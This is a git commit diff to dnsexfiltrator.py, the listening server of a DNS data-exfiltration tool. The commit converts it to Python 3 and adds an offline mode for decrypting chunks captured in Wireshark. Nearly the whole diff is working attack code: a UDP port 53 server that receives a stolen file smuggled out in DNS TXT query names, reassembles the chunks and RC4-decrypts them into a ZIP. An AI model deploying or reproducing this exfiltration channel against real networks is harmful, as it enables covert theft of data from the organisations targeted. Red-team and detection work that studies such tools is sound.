ea8874bae117f0d76ee62105898cbc30bd8060cd
hexp <hexp@nocent.xyz>
2018-06-23 10:33:16 +0200

    offline mode, python3
    converted to python3 and added an offline mode for using the script on chunks captured with wireshark for example

--- dnsexfiltrator.py
+++ dnsexfiltrator.py
@@ -15,7 +15,7 @@ import sys
 #------------------------------------------------------------------------
 class RC4:
 	def __init__(self, key = None):
-		self.state = range(256) # initialisation de la table de permutation
+		self.state = list(range(256)) # initialisation de la table de permutation
 		self.x = self.y = 0 # les index x et y, au lieu de i et j
 
 		if key is not None:
@@ -24,7 +24,7 @@ class RC4:
 
 	# Key schedule
 	def init(self, key):
-		for i in range(256):
+		for i in list(range(256)):
 			self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
 			self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
 		self.x = 0
@@ -32,7 +32,7 @@ class RC4:
 	# Decrypt binary input data
 	def binaryDecrypt(self, data):
 		output = [None]*len(data)
-		for i in xrange(len(data)):
+		for i in range(len(data)):
 			self.x = (self.x + 1) & 0xFF
 			self.y = (self.state[self.x] + self.y) & 0xFF
 			self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
@@ -127,97 +127,133 @@ if __name__ == '__main__':
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-d", "--domain", help="The domain name used to exfiltrate data", dest="domainName", required=True)
 	parser.add_argument("-p", "--password", help="The password used to encrypt/decrypt exfiltrated data", dest="password", required=True)
+	parser.add_argument("-f", "--filedata", help="The exfiltrated data as stdin input", dest="inputFile", required=False)
+	parser.add_argument("-o", "--outputfile", help="The output file name.", dest="outputFile", required=False)
+	parser.add_argument("-b", "--useBase32", help="pass if base32 was used", dest="useBase32", required=False)
 	args = parser.parse_args() 
 
-	# Setup a UDP server listening on port UDP 53	
-	udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	udps.bind(('',53))
-	print color("[*] DNS server listening on port 53")
-	
-	try:
-		useBase32 = False
-		chunkIndex = 0
-		fileData = ''
-		
-		while True:
-			data, addr = udps.recvfrom(1024)
-			request = DNSRecord.parse(data)
+	useBase32 = False;
 
-			#print color("[+] Received query: [{}] - Type: [{}]".format(qname, request.q.qtype))
-			
-			if request.q.qtype == 16:
-				
-				# Get the query qname
-				qname = str(request.q.qname)
-				
-				#-----------------------------------------------------------------------------
-				# Check if it is the initialization request
-				if qname.upper().startswith("INIT."):
-					msgParts = qname.split(".")
-					
-					msg = fromBase32(msgParts[1])
-					fileName = msg.split('|')[0]		# Name of the file being exfiltrated
-					nbChunks = int(msg.split('|')[1])	# Total number of chunks of data expected to receive
-					
-					if msgParts[2].upper() == "BASE32":
-						useBase32 = True
-						print color("[+] Data was encoded using Base32")
-					else:
-						print color("[+] Data was encoded using Base64URL")
+	if args.inputFile is not None:
+		print("[*] using offline mode as an inputFile was passed.")
+		print("[+] domain: " + args.domainName)
+		print("[+] password: " + args.password)
+		print("[+] inputFile: " + args.inputFile)
 
-					# Reset all variables
-					fileData = ''
-					chunkIndex = 0	
-					
-					print color("[+] Receiving file [{}] as a ZIP file in [{}] chunks".format(fileName,nbChunks))
-					
-					reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
-					reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
-					udps.sendto(reply.pack(), addr)
-					
-				#-----------------------------------------------------------------------------
-				# Else, start receiving the file, chunk by chunk
+		if args.useBase32 is not None:
+			useBase32 = True
+
+		fileData = args.inputFile;
+		fileName = args.outputFile
+
+		try:
+			rc4Decryptor = RC4(args.password)
+									
+			# Save data to a file
+			outputFileName = fileName + ".zip"
+			print(color("[+] Decrypting using password [{}] and saving to output file [{}]".format(args.password,outputFileName)))
+			with open(outputFileName, 'wb+') as fileHandle:
+				if useBase32:
+					fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase32(fileData))))
 				else:
-					msg = qname[0:-(len(args.domainName)+2)] # Remove the top level domain name
-					chunkNumber, rawData = msg.split('.',1)
-					
-					#---- Is this the chunk of data we're expecting?
-					if (int(chunkNumber) == chunkIndex):
-						fileData += rawData.replace('.','')
-						chunkIndex += 1
-						progress(chunkIndex, nbChunks, "Receiving file")
-					
-					#---- Always acknowledge the received chunk (whether or not it was already received)
-					reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
-					reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunkNumber)))
-					udps.sendto(reply.pack(), addr)
-					
-					#---- Have we received all chunks of data ?
-					if chunkIndex == nbChunks:
-						print '\n'
-						try:
-							# Create and initialize the RC4 decryptor object
-							rc4Decryptor = RC4(args.password)
-							
-							# Save data to a file
-							outputFileName = fileName + ".zip"
-							print color("[+] Decrypting using password [{}] and saving to output file [{}]".format(args.password,outputFileName))
-							with open(outputFileName, 'wb+') as fileHandle:
-								if useBase32:
-									fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase32(fileData))))
-								else:
-									fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase64URL(fileData))))
-								fileHandle.close()
-								print color("[+] Output file [{}] saved successfully".format(outputFileName))
-						except IOError:
-							print color("[!] Could not write file [{}]".format(outputFileName))
+					fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase64URL(fileData))))
+				fileHandle.close()
+				print(color("[+] Output file [{}] saved successfully".format(outputFileName)))
+		except IOError:
+			print(color("[!] Could not write file [{}]".format(outputFileName)))
+
+
+	else:
+
+		# Setup a UDP server listening on port UDP 53	
+		udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		udps.bind(('',53))
+		print(color("[*] DNS server listening on port 53"))
+		
+		try:
+			useBase32 = False
+			chunkIndex = 0
+			fileData = ''
+			
+			while True:
+				data, addr = udps.recvfrom(1024)
+				request = DNSRecord.parse(data)
+
+				#print color("[+] Received query: [{}] - Type: [{}]".format(qname, request.q.qtype))
 				
-			# Query type is not TXT
-			else:
-				reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
-				udps.sendto(reply.pack(), addr)
-	except KeyboardInterrupt:
-		pass
-	finally:
-		print color("[!] Stopping DNS Server")
-		udps.close()
+				if request.q.qtype == 16:
+					
+					# Get the query qname
+					qname = str(request.q.qname)
+					
+					#-----------------------------------------------------------------------------
+					# Check if it is the initialization request
+					if qname.upper().startswith("INIT."):
+						msgParts = qname.split(".")
+						
+						msg = fromBase32(msgParts[1])
+						fileName = msg.split('|')[0]		# Name of the file being exfiltrated
+						nbChunks = int(msg.split('|')[1])	# Total number of chunks of data expected to receive
+						
+						if msgParts[2].upper() == "BASE32":
+							useBase32 = True
+							print(color("[+] Data was encoded using Base32"))
+						else:
+							print(color("[+] Data was encoded using Base64URL"))
+
+						# Reset all variables
+						fileData = ''
+						chunkIndex = 0	
+						
+						print(color("[+] Receiving file [{}] as a ZIP file in [{}] chunks".format(fileName,nbChunks)))
+						
+						reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
+						reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
+						udps.sendto(reply.pack(), addr)
+						
+					#-----------------------------------------------------------------------------
+					# Else, start receiving the file, chunk by chunk
+					else:
+						msg = qname[0:-(len(args.domainName)+2)] # Remove the top level domain name
+						chunkNumber, rawData = msg.split('.',1)
+						
+						#---- Is this the chunk of data we're expecting?
+						if (int(chunkNumber) == chunkIndex):
+							fileData += rawData.replace('.','')
+							chunkIndex += 1
+							progress(chunkIndex, nbChunks, "Receiving file")
+						
+						#---- Always acknowledge the received chunk (whether or not it was already received)
+						reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
+						reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunkNumber)))
+						udps.sendto(reply.pack(), addr)
+						
+						#---- Have we received all chunks of data ?
+						if chunkIndex == nbChunks:
+							print('\n')
+							try:
+								# Create and initialize the RC4 decryptor object
+								rc4Decryptor = RC4(args.password)
+								
+								# Save data to a file
+								outputFileName = fileName + ".zip"
+								print(color("[+] Decrypting using password [{}] and saving to output file [{}]".format(args.password,outputFileName)))
+								with open(outputFileName, 'wb+') as fileHandle:
+									if useBase32:
+										fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase32(fileData))))
+									else:
+										fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase64URL(fileData))))
+									fileHandle.close()
+									print(color("[+] Output file [{}] saved successfully".format(outputFileName)))
+							except IOError:
+								print(color("[!] Could not write file [{}]".format(outputFileName)))
+					
+				# Query type is not TXT
+				else:
+					reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+					udps.sendto(reply.pack(), addr)
+		except KeyboardInterrupt:
+			pass
+		finally:
+			print(color("[!] Stopping DNS Server"))
+			udps.close()
